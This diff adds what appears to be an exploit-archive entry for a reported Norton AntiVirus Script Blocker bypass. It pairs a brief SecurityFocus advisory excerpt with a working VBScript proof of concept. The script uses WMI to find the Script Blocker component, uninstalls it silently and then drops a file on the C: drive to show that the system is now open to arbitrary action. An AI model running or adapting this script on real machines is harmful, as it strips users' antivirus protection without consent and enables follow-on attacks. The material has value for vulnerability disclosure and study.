@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/10739/info
+
+It is reported that Symantec Norton AntiVirus is prone to a Script Blocker denial of service vulnerability. This may result in a Symantec Norton AntiVirus Script Blocker bypass.
+
+The privileges and zone required so that the script is successful in exploiting this issue are not known.
+
+Symantec is currently investigating this vulnerability and this BID will be updated, as further analysis is complete. 
+
+' get wmi
+set wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+' enum soft
+for each e in wmi.ExecQuery("Select * from Win32_Product")
+on error resume next
+' uninstall script blocker part of norton
+if instr(e.name,"Script") and instr(e.name,"Block") then
+e.UnInstall()
+end if
+next
+
+' just do what you like
+set fso = createobject("scripting.filesystemobject")
+fso.createtextfile("c:\byenav.txt").write "=)" 
